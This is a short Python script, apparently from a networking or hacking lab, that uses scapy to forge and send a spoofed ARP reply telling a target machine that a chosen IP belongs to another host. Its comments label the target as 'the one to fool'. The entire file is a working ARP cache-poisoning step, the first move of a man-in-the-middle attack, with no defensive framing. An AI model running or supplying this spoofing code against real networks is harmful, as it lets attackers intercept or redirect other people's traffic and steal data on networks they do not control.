#!/usr/bin/env python

import scapy.all as scapy


# op=2 to creat an ARP response
# pdst -> ip target the one to fool
# hwdst -> mac target the one to fool
# psrc -> ip to simulate
# For more info print(packet.show())
# For more info print(packet.summary())
packet = scapy.ARP(op=2, pdst="192.168.180.9", hwdst="08:00:27:44:6a:48",
                   psrc="192.168.180.100")  # , hwsrc="08:00:00:00:00:3c")
scapy.send(packet)
